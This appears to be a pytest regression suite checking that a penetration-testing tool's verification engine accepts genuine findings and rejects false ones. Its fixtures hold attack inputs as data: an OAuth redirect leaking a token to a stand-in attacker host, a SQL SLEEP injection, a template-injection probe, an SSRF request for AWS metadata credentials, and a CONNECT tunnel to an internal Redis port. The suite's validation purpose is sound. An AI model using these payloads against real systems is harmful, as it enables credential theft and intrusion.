"""
PenFlow Golden Regression Suite.
Rigorous adversarial falsification regression suite containing positive and negative
test cases across all primary vulnerability domains (OAuth, SQLi, SSTI, BOLA, SSRF, Headers, CONNECT).
"""
import pytest
from penflow.validation.critic_engine import CriticVerificationEngine
from penflow.knowledge.evidence_cas import EvidenceCAS

@pytest.fixture
def critic():
    return CriticVerificationEngine()

@pytest.fixture
def cas():
    return EvidenceCAS()

# ─────────────────────────────────────────────────────────────────────────────
# 1. OAUTH
# ─────────────────────────────────────────────────────────────────────────────
def test_oauth_cdn_internal_redirect_negative(critic, cas):
    """Negative: 301 CDN Redirect to legitimate internal domain (nu.com.mx) must be FALSIFIED."""
    raw_oauth_neg = {
        "is_vulnerable": True,
        "confidence_score": 0.95,
        "reasoning": "OAuth redirect manipulation: Server redirected to target internal domain.",
        "target_url": "https://nu.com.mx/login",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://nu.com.mx/oauth/callback?redirect_uri=https://nu.com.mx"},
                "response": {
                    "status_code": 301,
                    "headers": {"Location": "https://nu.com.mx/dashboard", "Server": "CloudFront"},
                    "body_snippet": ""
                }
            }
        ]
    }
    b = cas.store_evidence("nu.com.mx", "oauth_misconfiguration", raw_oauth_neg)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"OAuth Negative Failed: {res}"

def test_oauth_token_leak_external_oob_positive(critic, cas):
    """Positive: OAuth redirecting to external attacker collaborator domain must be VERIFIED."""
    raw_oauth_pos = {
        "is_vulnerable": True,
        "confidence_score": 0.95,
        "reasoning": "CRITICAL OAuth State Verification Flaw: Token leaked to external collaborator.",
        "target_url": "https://nu.com.mx/oauth/callback",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://nu.com.mx/oauth/callback?redirect_uri=https://attacker.interactsh.com"},
                "response": {
                    "status_code": 302,
                    "headers": {"Location": "https://attacker.interactsh.com/token?access_token=secret123"},
                    "body_snippet": "Redirecting..."
                }
            }
        ]
    }
    b = cas.store_evidence("nu.com.mx", "oauth_misconfiguration", raw_oauth_pos)
    res = critic.verify_finding(b)
    assert res["is_verified"], f"OAuth Positive Failed: {res}"

# ─────────────────────────────────────────────────────────────────────────────
# 2. SQL INJECTION (TIMING & BLIND)
# ─────────────────────────────────────────────────────────────────────────────
def test_sqli_timing_delay_404_negative(critic, cas):
    """Negative: Delay on HTTP 404 Not Found (Report 32 pattern) must be FALSIFIED."""
    raw_sqli_404 = {
        "is_vulnerable": True,
        "confidence_score": 0.93,
        "reasoning": "CRITICAL Time-based Blind SQLi: Payload '1' AND SLEEP(3)--' induced 3.03s delay (threshold: 3.0s).",
        "target_url": "https://lab.net/product?productId=1",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/product?productId=1"},
                "response": {"status_code": 404, "body_snippet": '"Not Found"'}
            }
        ]
    }
    b = cas.store_evidence("lab.net", "sql_injection", raw_sqli_404)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"SQLi 404 Negative Failed: {res}"

def test_sqli_timing_delay_405_negative(critic, cas):
    """Negative: Delay on HTTP 405 Method Not Allowed (Report 33 pattern) must be FALSIFIED."""
    raw_sqli_405 = {
        "is_vulnerable": True,
        "confidence_score": 0.93,
        "reasoning": "CRITICAL Time-based Blind SQLi: Payload '1' AND SLEEP(3)--' induced 3.22s delay (threshold: 3.0s).",
        "target_url": "https://lab.net/product/stock?storeId=1",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/product/stock?storeId=1"},
                "response": {"status_code": 405, "body_snippet": '"Method Not Allowed"'}
            }
        ]
    }
    b = cas.store_evidence("lab.net", "sql_injection", raw_sqli_405)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"SQLi 405 Negative Failed: {res}"

def test_sqli_soft_error_200_negative(critic, cas):
    """Negative: Delay on HTTP 200 containing soft error body must be FALSIFIED."""
    raw_sqli_soft = {
        "is_vulnerable": True,
        "confidence_score": 0.93,
        "reasoning": "CRITICAL Time-based Blind SQLi: Payload induced 3.10s delay.",
        "target_url": "https://lab.net/product?productId=1",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/product?productId=1"},
                "response": {"status_code": 200, "body_snippet": '{"error": "Invalid product ID"}'}
            }
        ]
    }
    b = cas.store_evidence("lab.net", "sql_injection", raw_sqli_soft)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"SQLi Soft Error Negative Failed: {res}"

def test_sqli_error_based_extraction_positive(critic, cas):
    """Positive: Genuine SQL database syntax error on HTTP 200 must be VERIFIED."""
    raw_sqli_pos = {
        "is_vulnerable": True,
        "confidence_score": 0.98,
        "reasoning": "CRITICAL Error-based SQLi: PostgreSQL syntax error revealed.",
        "target_url": "https://lab.net/filter?category=Gifts",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/filter?category=Gifts%27"},
                "response": {
                    "status_code": 200,
                    "body_snippet": "Internal Server Error: org.postgresql.util.PSQLException: unterminated quoted string at or near '''"
                }
            }
        ]
    }
    b = cas.store_evidence("lab.net", "sql_injection", raw_sqli_pos)
    res = critic.verify_finding(b)
    assert res["is_verified"], f"SQLi Positive Failed: {res}"

# ─────────────────────────────────────────────────────────────────────────────
# 3. SSTI
# ─────────────────────────────────────────────────────────────────────────────
def test_ssti_fake_match_shop_price_negative(critic, cas):
    """Negative: Price match $49.00 on store page without evaluation must be FALSIFIED."""
    raw_ssti_neg = {
        "is_vulnerable": True,
        "confidence_score": 0.96,
        "reasoning": "CRITICAL SSTI Confirmed [Universal Polyglot Match]: Evaluated expression in response.",
        "target_url": "https://lab.net/?q=${'z'*1000}",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/?q=${'z'*1000}"},
                "response": {"status_code": 200, "body_text": '<html><body><h1>Our Products</h1><p>Price: $49.00</p></body></html>'}
            }
        ]
    }
    b = cas.store_evidence("lab.net", "ssti_rce", raw_ssti_neg)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"SSTI Negative Failed: {res}"

def test_ssti_mathematical_evaluation_proof_positive(critic, cas):
    """Positive: Genuine SSTI math evaluation 48239 * 71 = 3424969 must be VERIFIED."""
    raw_ssti_pos = {
        "is_vulnerable": True,
        "confidence_score": 0.98,
        "reasoning": "CRITICAL SSTI Confirmed: Expression {{48239*71}} evaluated to 3424969.",
        "target_url": "https://lab.net/?message={{48239*71}}",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/?message=control"},
                "response": {"status_code": 200, "body_text": "<html><h1>Hello control</h1></html>"}
            },
            {
                "request": {"method": "GET", "url": "https://lab.net/?message={{48239*71}}"},
                "response": {"status_code": 200, "body_text": "<html><h1>Hello 3424969</h1></html>"}
            }
        ]
    }
    b = cas.store_evidence("lab.net", "ssti_rce", raw_ssti_pos)
    res = critic.verify_finding(b)
    assert res["is_verified"], f"SSTI Positive Failed: {res}"

# ─────────────────────────────────────────────────────────────────────────────
# 4. BOLA / IDOR
# ─────────────────────────────────────────────────────────────────────────────
def test_bola_identical_public_login_page_negative(critic, cas):
    """Negative: Identical public login HTML returned for different IDs must be FALSIFIED."""
    raw_bola_neg = {
        "is_vulnerable": True,
        "confidence_score": 0.90,
        "reasoning": "BOLA Broken Object Level Auth: Accessed object without restriction.",
        "target_url": "https://lab.net/my-account?id=carlos",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/my-account?id=wiener"},
                "response": {"status_code": 200, "body_text": "<!DOCTYPE html><html><body><h1>Please Log In</h1></body></html>"}
            },
            {
                "request": {"method": "GET", "url": "https://lab.net/my-account?id=carlos"},
                "response": {"status_code": 200, "body_text": "<!DOCTYPE html><html><body><h1>Please Log In</h1></body></html>"}
            }
        ]
    }
    b = cas.store_evidence("lab.net", "bola", raw_bola_neg)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"BOLA Negative Failed: {res}"

def test_idor_private_data_leak_positive(critic, cas):
    """Positive: True IDOR leaking private profile attributes and API key must be VERIFIED."""
    raw_bola_pos = {
        "is_vulnerable": True,
        "confidence_score": 0.95,
        "reasoning": "CRITICAL IDOR: Accessed Carlos private profile and API key.",
        "target_url": "https://lab.net/api/user/carlos",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net/api/user/carlos"},
                "response": {
                    "status_code": 200,
                    "body_text": '{"username": "carlos", "email": "carlos@victim.com", "apikey": "secret_live_99812", "balance": 15000}'
                }
            }
        ]
    }
    b = cas.store_evidence("lab.net", "idor", raw_bola_pos)
    res = critic.verify_finding(b)
    assert res["is_verified"], f"BOLA Positive Failed: {res}"

# ─────────────────────────────────────────────────────────────────────────────
# 5. SSRF
# ─────────────────────────────────────────────────────────────────────────────
def test_ssrf_relative_same_host_redirect_negative(critic, cas):
    """Negative: Relative redirect to same target host must be FALSIFIED."""
    raw_ssrf_neg = {
        "is_vulnerable": True,
        "confidence_score": 0.90,
        "reasoning": "SSRF vulnerability: Backend redirected to relative static resource.",
        "target_url": "https://lab.net/product/stock",
        "evidence_exchanges": [
            {
                "request": {"method": "POST", "url": "https://lab.net/product/stock", "body": "stockApi=/product"},
                "response": {
                    "status_code": 302,
                    "headers": {"Location": "/product"},
                    "body_snippet": "Found"
                }
            }
        ]
    }
    b = cas.store_evidence("lab.net", "ssrf", raw_ssrf_neg)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"SSRF Negative Failed: {res}"

def test_ssrf_aws_cloud_metadata_exfiltration_positive(critic, cas):
    """Positive: True SSRF leaking AWS IAM metadata credentials must be VERIFIED."""
    raw_ssrf_pos = {
        "is_vulnerable": True,
        "confidence_score": 0.99,
        "reasoning": "CRITICAL Cloud Metadata Exfiltration: AWS IAM role credentials retrieved.",
        "target_url": "https://lab.net/product/stock",
        "evidence_exchanges": [
            {
                "request": {"method": "POST", "url": "https://lab.net/product/stock", "body": "stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"},
                "response": {
                    "status_code": 200,
                    "body_text": '{"Code": "Success", "AccessKeyId": "ASIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}'
                }
            }
        ]
    }
    b = cas.store_evidence("lab.net", "ssrf", raw_ssrf_pos)
    res = critic.verify_finding(b)
    assert res["is_verified"], f"SSRF Positive Failed: {res}"

# ─────────────────────────────────────────────────────────────────────────────
# 6. MISSING SECURITY HEADERS
# ─────────────────────────────────────────────────────────────────────────────
def test_missing_security_headers_capped_informative_positive(critic, cas):
    """Positive: Missing security headers capped at Informative severity (<= 0.30) must be VERIFIED."""
    raw_headers = {
        "is_vulnerable": True,
        "confidence_score": 0.90,
        "reasoning": "Target missing Content-Security-Policy and Strict-Transport-Security headers.",
        "target_url": "https://lab.net",
        "evidence_exchanges": [
            {
                "request": {"method": "GET", "url": "https://lab.net"},
                "response": {"status_code": 200, "headers": {"Server": "Apache"}, "body_snippet": "<html></html>"}
            }
        ]
    }
    b = cas.store_evidence("lab.net", "missing_headers", raw_headers)
    res = critic.verify_finding(b)
    assert res["is_verified"], f"Headers Positive Failed: {res}"
    assert res["confidence"] <= 0.30, f"Headers should be capped at <= 0.30, got {res['confidence']}"

# ─────────────────────────────────────────────────────────────────────────────
# 7. HTTP/2 CONNECT TUNNEL
# ─────────────────────────────────────────────────────────────────────────────
def test_http2_connect_generic_html_negative(critic, cas):
    """Negative: Standard 200 HTML web page returned on CONNECT must be FALSIFIED."""
    raw_h2_neg = {
        "is_vulnerable": True,
        "confidence_score": 0.95,
        "reasoning": "HTTP/2 CONNECT method established an unauthenticated tunnel to internal endpoint 'localhost:8080'.",
        "target_url": "https://lab.net/",
        "evidence_exchanges": [
            {
                "request": {"method": "CONNECT", "url": "https://lab.net/", "headers": {":authority": "localhost:8080"}},
                "response": {
                    "status_code": 200,
                    "headers": {"content-type": "text/html; charset=utf-8"},
                    "body_snippet": "<!DOCTYPE html><html><body><h1>Online Shop</h1></body></html>"
                }
            }
        ]
    }
    b = cas.store_evidence("lab.net", "http2_connect_tunnel", raw_h2_neg)
    res = critic.verify_finding(b)
    assert not res["is_verified"], f"HTTP/2 CONNECT Negative Failed: {res}"

def test_http2_connect_internal_service_stream_positive(critic, cas):
    """Positive: Genuine internal Redis / IMDS banner on CONNECT tunnel must be VERIFIED."""
    raw_h2_pos = {
        "is_vulnerable": True,
        "confidence_score": 0.95,
        "reasoning": "HTTP/2 CONNECT method established an unauthenticated tunnel leaking internal Redis banner.",
        "target_url": "https://lab.net/",
        "evidence_exchanges": [
            {
                "request": {"method": "CONNECT", "url": "https://lab.net/", "headers": {":authority": "127.0.0.1:6379"}},
                "response": {
                    "status_code": 200,
                    "headers": {"content-type": "application/octet-stream"},
                    "body_snippet": "+PONG\r\nredis_version:7.0.1"
                }
            }
        ]
    }
    b = cas.store_evidence("lab.net", "http2_connect_tunnel", raw_h2_pos)
    res = critic.verify_finding(b)
    assert res["is_verified"], f"HTTP/2 CONNECT Positive Failed: {res}"
